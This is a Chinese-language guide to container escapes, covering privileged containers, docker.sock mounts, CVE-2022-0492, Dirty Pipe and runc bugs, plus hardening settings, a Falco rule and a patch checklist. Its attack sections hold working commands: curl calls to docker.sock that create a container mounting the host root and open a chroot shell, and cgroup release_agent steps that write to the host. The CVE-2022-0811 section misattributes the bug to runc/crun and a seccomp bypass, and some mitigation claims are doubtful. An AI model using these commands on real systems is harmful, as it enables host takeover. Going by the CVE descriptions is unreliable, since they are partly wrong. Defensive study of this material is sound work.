# 容器逃逸技术大全：CVE-2022-0492 / CVE-2022-0811 / Dirty Pipe

---

## 一、容器逃逸的三大路径

容器逃逸本质是打破 **Namespace + Cgroup + Seccomp + Capabilities** 这四层隔离。实际攻击路径归纳为三类：

| 类型 | 代表场景 |
|------|---------|
| **配置缺陷导致** | `--privileged`、挂载 `/var/run/docker.sock`、`--cap-add SYS_ADMIN` |
| **内核漏洞利用** | Dirty Pipe、CVE-2022-0492（cgroups v1 发布通知）、CVE-2021-22555 |
| **运行时漏洞** | containerd / runc / crun 自身缺陷，如 CVE-2022-0811、CVE-2019-5736 |

## 二、配置缺陷类逃逸速查

### 2.1 特权容器 + 设备挂载

```bash
# 场景：容器以 --privileged 启动
# 利用：加载宿主机 debugfs、直接 mknod 访问块设备
mkdir -p /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
# 之后构造 release_agent 路径写入宿主机 root
```

### 2.2 docker.sock 挂载

```bash
# 场景：-v /var/run/docker.sock:/var/run/docker.sock
# 利用：直接在容器里 docker run 一个特权容器挂载 /
curl --unix-socket /var/run/docker.sock \
  "http://localhost/containers/json"
curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create?name=pwned" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Binds":["/:/host"],"Cmd":["chroot","/host","/bin/bash"]}'
```

### 2.3 SYS_ADMIN + cgroups v1 利用（CVE-2022-0492）

影响：Linux 内核 ≤ 5.17-rc1，且未打补丁。容器拥有 `CAP_SYS_ADMIN` 且运行在 cgroups v1 环境下。

```bash
# 简化利用流程：
# 1) 挂载一个 cgroup 控制器；2) 创建子 cgroup；3) 写入 notify_on_release=1；
# 4) 把 release_agent 路径指向宿主机 root；5) 让该 cgroup 进程退出触发回调
cat > /exp.sh <<'EOF'
#!/bin/sh
echo "pwned" > /host/etc/pwned
EOF
```

## 三、内核漏洞类逃逸详解

### 3.1 Dirty Pipe（CVE-2022-0847）

原理：Linux 内核管道 `pipe_buffer` 合并时未正确设置 `PIPE_BUF_FLAG_CAN_MERGE`，导致可向只读的 page cache 写入数据。

```c
// 关键思路（poc 精简版）：
// 1. 创建管道并反复写入以把 page 设置为 CAN_MERGE
// 2. splice() 让 pipe 指向目标文件 page（只读）
// 3. write(pipe) 覆盖只读 page，直接越权修改宿主机文件
// 经典：改写 /etc/passwd 添加 root 权限用户或覆盖 SUID 二进制
```

### 3.2 CVE-2022-0811（runc/crun）

原理：`runc/crun` 解析 `linux.personality` 时可被设置为 `PER_LINUX32`，结合 `unshare` syscall 绕过 seccomp 白名单。

```bash
# 在容器内构造 personality=0x0008 使得 32 位 ABI 不受 seccomp 规则约束
# 进而执行 32 位 int 0x80 绕过 seccomp，直接在内核空间系统调用
```

### 3.3 CVE-2019-5736（runc 容器逃逸经典）

通过覆盖宿主机 runc 二进制并在容器退出时以宿主机 root 执行被篡改文件。

## 四、防御策略总览

### 4.1 配置层面

```yaml
# Kubernetes PodSecurity restricted 模板片段
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 10000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
```

### 4.2 内核与运行时层面

| 动作 | 目的 |
|------|------|
| `yum/dnf/apt upgrade kernel` | 打补丁 |
| 使用 cgroups v2（systemd cgroup driver） | 缓解 CVE-2022-0492 路径 |
| `s390x / arm64` 非 x86 架构不易受 32 位 ABI 类绕过 | 架构层面天然隔离 |
| 开启内核 `LOCKDOWN` 模式 | 阻止内核模块加载 |

### 4.3 检测层面

```bash
# Falco 规则示例：检测特权容器或 docker.sock 挂载
- rule: Privileged Container Spawned
  desc: detect privileged container
  condition: spawned_process and container.privileged=true
  output: "Privileged container spawned (user=%user.name container=%container.id)"
  priority: WARNING
```

## 五、实战排查 Checklist

- [ ] 扫描 CVE-2022-0492 / CVE-2022-0811 / CVE-2022-0847 补丁状态
- [ ] 使用 `kubectl get pods -o json | jq '.items[].spec.containers[].securityContext'` 排查特权容器
- [ ] grep 代码仓库中是否存在 `--privileged` 或 docker.sock 挂载
- [ ] 内核 ≥ 5.15 并启用 LOCKDOWN
- [ ] 运行时 runc ≥ 1.1.4、containerd ≥ 1.6.14
- [ ] 安装 Falco / Tracee 做运行时异常行为监控
